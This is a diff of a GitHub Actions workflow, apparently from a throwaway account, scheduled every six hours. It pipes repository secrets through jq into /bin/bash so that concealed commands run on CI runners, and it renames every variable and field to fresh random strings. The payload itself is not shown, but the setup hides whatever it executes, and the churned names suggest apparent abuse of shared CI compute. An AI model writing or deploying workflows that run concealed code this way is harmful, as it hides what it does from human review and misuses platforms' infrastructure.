@@ -3,26 +3,27 @@ name: xieqianli3765
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 0/6 * * *'
-jobs:  # 9613
+    - cron: '38 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xieqianli3765
         env:
-          lob602: ${{ secrets.lob602 }}
+          y3: ${{ secrets.y3 }}
         run: |
-          echo $lob602 | jq -r .r5453 | /bin/bash
-          echo $xm57255 | jq -r .nu8273 | /bin/bash
-          echo $dcbo733 | jq -r .x4125 | /bin/bash
-          echo $yhwvk24 | jq -r .w36098 | /bin/bash
-          echo $reuo403 | jq -r .kv535 | /bin/bash
-          echo $fix03013 | jq -r .ehbkb8112 | /bin/bash
-          echo $kjnp21 | jq -r .rcd7 | /bin/bash
-          echo $biaux3202 | jq -r .uv37 | /bin/bash
-          echo $i5 | jq -r .naxs35877 | /bin/bash
-          echo $kwa436 | jq -r .nx18 | /bin/bash
-          echo $yjtoh17076 | jq -r .smnxf77 | /bin/bash
-          echo $jutk4097 | jq -r .mt74694 | /bin/bash
+          echo $y3 | jq -r .o9 | /bin/bash
+          echo $whggf8570 | jq -r .mtnd0631 | /bin/bash
+          echo $au7 | jq -r .hqw99077 | /bin/bash
+          echo $qgcoz0240 | jq -r .esyvz2 | /bin/bash
+          echo $mawjd152 | jq -r .ne4646 | /bin/bash
+          echo $mrz01 | jq -r .lncaq96932 | /bin/bash
+          echo $psn04 | jq -r .lum00885 | /bin/bash
+          echo $xvm83331 | jq -r .s4358 | /bin/bash
+          echo $kcgwz415 | jq -r .snvj456 | /bin/bash
+          echo $ijmr9 | jq -r .g6 | /bin/bash
+          echo $rm42322 | jq -r .e2351 | /bin/bash
+          echo $btk58149 | jq -r .logna8 | /bin/bash
 
